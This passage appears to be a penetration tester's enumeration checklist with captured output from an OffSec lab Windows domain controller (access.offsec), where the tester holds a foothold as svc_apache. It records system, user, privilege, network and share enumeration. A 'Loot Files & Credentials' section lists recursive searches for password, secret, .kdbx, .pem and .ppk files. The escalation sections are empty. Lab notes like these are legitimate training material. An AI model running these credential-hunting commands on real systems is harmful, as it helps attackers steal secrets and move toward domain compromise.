                           [08]: KB5005112
                           [09]: KB5011551
                           [10]: KB5006754
                           [11]: KB5009642
                           [12]: KB5011574
                           [13]: KB5005701
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.240.187
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

[+] OS summary

Caption                                    Version    BuildNumber OSArchitecture
-------                                    -------    ----------- --------------
Microsoft Windows Server 2019 Standard     10.0.17763 17763       64-bit        

[+] hotfixes (first 50)
http://support.microsoft.com/?kbid=5009472                                      
http://support.microsoft.com/?kbid=4512577                                      
http://support.microsoft.com/?kbid=4535680                                      
https://support.microsoft.com/help/4577586                                      
https://support.microsoft.com/help/4589208                                      
https://support.microsoft.com/help/5003243                                      
https://support.microsoft.com/help/5003711                                      
https://support.microsoft.com/help/5005112                                      
https://support.microsoft.com/help/5011551                                      
                                                                                
                                                                                
                                                                                
                                                                                

[+] env vars (username/computername/userdomain)
svc_apache
SERVER
ACCESS

[+] Get-ComputerInfo (first 50)
                                                                                

[+] Win32_OperatingSystem
Microsoft Windows Server 2019 Standard     10.0.17763 17763       64-bit        

[+] Win32_ComputerSystem
SERVER  

```

3. Environment

```

# Powershell

Get-ChildItem Env:

$env:Path
[+] PATH
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_apache\AppData\Local\Microsoft\WindowsApps

Get-ExecutionPolicy -List

```

  4. Users & Groups

```

[+] net users
$ net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.


[+] net localgroup
$ net localgroup

Aliases for \\SERVER

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.


[+] local administrators
$ net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.


[+] Get-LocalUser (if available)
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                

[+] Get-LocalGroup (if available)
                                                                                
                                                                                
                                                                                
                                                                                

[+] Get-LocalGroupMember Administrators (if available)
Get-LocalGroupMember : Group Administrators was not found.
At C:\xampp\htdocs\uploads\privesc.ps1:77 char:63
+ ... tors (if available)" { Get-LocalGroupMember -Group "Administrators" }
+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Administrators:String) [Get-LocalGroupMember], GroupNotFoundException
    + FullyQualifiedErrorId : GroupNotFound,Microsoft.PowerShell.Commands.GetLocalGroupMemberCommand
 

[+] whoami /all
$ whoami /all

USER INFORMATION
----------------

User Name         SID                                         
================= ============================================
access\svc_apache S-1-5-21-537427935-490066102-1511301751-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

  5.  AD Enumeration

```

# Powershell

Get-ADUser -Filter * (domain joined)

Get-ADGroup -Filter *

Get-ADGroupMember "Domain Admins"

```

  6. Privileges & Tokens

```

# CMD

[+] whoami /priv
$ whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

  7. UAC & Policy Checks

```

# CMD

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

  8. Processes & Services

```

# CMD

sc query

sc qc <service_name>

wmic service list brief

wmic service get name,displayname,pathname,startmode

tasklist

tasklist /v

tasklist /svc

wmic process list brief

  

# Powershell

Get-Service

Get-WmiObject Win32_Service | Select Name,StartMode,State,PathName

Get-Service | Where-Object {$_.Status -eq "Running"}

Get-Process

Get-Process -IncludeUserName

Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath

```

  9.  Scheduled Tasks

```

# CMD

schtasks /query /fo LIST /v

  

# Powershell

Get-ScheduledTask

```

  10.  Network

```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2692
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2692
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       540
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       60
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       1388
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       1740
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       2244
  TCP    0.0.0.0:49701          0.0.0.0:0              LISTENING       2288
  TCP    0.0.0.0:49719          0.0.0.0:0              LISTENING       624
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2244
  TCP    127.0.0.1:389          127.0.0.1:49675        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:49677        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64735        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64741        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64887        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64890        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:65006        ESTABLISHED     632
  TCP    127.0.0.1:49675        127.0.0.1:389          ESTABLISHED     2200
  TCP    127.0.0.1:49677        127.0.0.1:389          ESTABLISHED     2200
  TCP    127.0.0.1:64735        127.0.0.1:389          ESTABLISHED     2244
  TCP    127.0.0.1:64741        127.0.0.1:389          ESTABLISHED     2244
  TCP    127.0.0.1:64887        127.0.0.1:389          ESTABLISHED     2228
  TCP    127.0.0.1:64890        127.0.0.1:389          ESTABLISHED     2228
  TCP    127.0.0.1:65006        127.0.0.1:389          ESTABLISHED     2228
  TCP    192.168.240.187:53     0.0.0.0:0              LISTENING       2244
  TCP    192.168.240.187:80     192.168.45.230:37736   ESTABLISHED     2692
  TCP    192.168.240.187:80     192.168.45.230:38726   ESTABLISHED     2692
  TCP    192.168.240.187:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.240.187:389    192.168.240.187:64811  ESTABLISHED     632
  TCP    192.168.240.187:389    192.168.240.187:64818  ESTABLISHED     632
  TCP    192.168.240.187:64811  192.168.240.187:389    ESTABLISHED     2288
  TCP    192.168.240.187:64818  192.168.240.187:389    ESTABLISHED     2288
  TCP    192.168.240.187:64961  192.168.45.230:443     ESTABLISHED     4212
  TCP    192.168.240.187:65009  20.190.157.9:443       ESTABLISHED     60
  TCP    192.168.240.187:65010  199.232.210.172:80     SYN_SENT        60
  TCP    [::]:80                [::]:0                 LISTENING       2692
  TCP    [::]:88                [::]:0                 LISTENING       632
  TCP    [::]:135               [::]:0                 LISTENING       892
  TCP    [::]:443               [::]:0                 LISTENING       2692
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       632
  TCP    [::]:593               [::]:0                 LISTENING       892
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2228
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       540
  TCP    [::]:49665             [::]:0                 LISTENING       1040
  TCP    [::]:49666             [::]:0                 LISTENING       60
  TCP    [::]:49668             [::]:0                 LISTENING       632
  TCP    [::]:49669             [::]:0                 LISTENING       632
  TCP    [::]:49670             [::]:0                 LISTENING       632
  TCP    [::]:49673             [::]:0                 LISTENING       1388
  TCP    [::]:49678             [::]:0                 LISTENING       1740
  TCP    [::]:49691             [::]:0                 LISTENING       2244
  TCP    [::]:49701             [::]:0                 LISTENING       2288
  TCP    [::]:49719             [::]:0                 LISTENING       624
  TCP    [::1]:53               [::]:0                 LISTENING       2244
  TCP    [::1]:445              [::1]:65007            ESTABLISHED     4
  TCP    [::1]:5985             [::1]:64967            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64968            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64969            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64970            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64971            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64972            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64973            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64974            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64975            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64976            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64977            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64978            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64979            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64980            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64981            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64982            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64983            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64984            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64985            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64986            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64987            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64988            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64989            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64990            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64991            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64992            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64993            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64994            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64995            TIME_WAIT       0
  TCP    [::1]:5985             [::1]:64996            TIME_WAIT       0
  TCP    [::1]:9389             [::1]:64998            ESTABLISHED     2228
  TCP    [::1]:9389             [::1]:64999            ESTABLISHED     2228
  TCP    [::1]:9389             [::1]:65000            ESTABLISHED     2228
  TCP    [::1]:9389             [::1]:65001            ESTABLISHED     2228
  TCP    [::1]:9389             [::1]:65002            ESTABLISHED     2228
  TCP    [::1]:9389             [::1]:65008            ESTABLISHED     2228
  TCP    [::1]:49668            [::1]:49716            ESTABLISHED     632
  TCP    [::1]:49668            [::1]:49789            ESTABLISHED     632
  TCP    [::1]:49668            [::1]:64966            ESTABLISHED     632
  TCP    [::1]:49716            [::1]:49668            ESTABLISHED     2288
  TCP    [::1]:49789            [::1]:49668            ESTABLISHED     632
  TCP    [::1]:64965            [::1]:135              TIME_WAIT       0
  TCP    [::1]:64966            [::1]:49668            ESTABLISHED     632
  TCP    [::1]:64997            [::1]:9389             TIME_WAIT       0
  TCP    [::1]:64998            [::1]:9389             ESTABLISHED     5848
  TCP    [::1]:64999            [::1]:9389             ESTABLISHED     5848
  TCP    [::1]:65000            [::1]:9389             ESTABLISHED     5848
  TCP    [::1]:65001            [::1]:9389             ESTABLISHED     5848
  TCP    [::1]:65002            [::1]:9389             ESTABLISHED     5848
  TCP    [::1]:65007            [::1]:445              ESTABLISHED     4
  TCP    [::1]:65008            [::1]:9389             ESTABLISHED     5848


```

  11. Software

```

[+] installed products (wmic)
$ wmic product get name,version
Name                                                            Version          

Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127  14.24.28127      

Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127  14.24.28127      

VMware Tools                                                    11.1.1.16303738  

Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127     14.24.28127      

Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127     14.24.28127 

```

  12. Shares & Drivers

```

[+] net share
$ net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
NETLOGON     C:\Windows\SYSVOL\sysvol\access.offsec\SCRIPTS
                                             Logon server share                
SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
The command completed successfully.


```

  13. Loot Files & Credentials

```

# CMD

dir C:\

dir C:\Users

dir C:\Users\<user>\Desktop

dir C:\Users\<user>\Documents

dir C:\Users\<user>\Downloads

dir C:\Users\<user>\AppData\Roaming

dir C:\Users\<user>\AppData\Local

dir C:\inetpub\wwwroot

dir C:\xampp

dir C:\wamp

dir /s /b *.txt *.ini *.cfg *.conf *.xml *.log *.bak *.ps1 *.kdbx *.rdp *.ppk *.pem

  

# Powershell

Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx -ErrorAction SilentlyContinue

Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction SilentlyContinue

```

14. Automated Enumeration

```




```

15. Possible PE Paths

```



```

**Privilege Escalation**

1. PE Steps

```

```

2. Notes

```

```

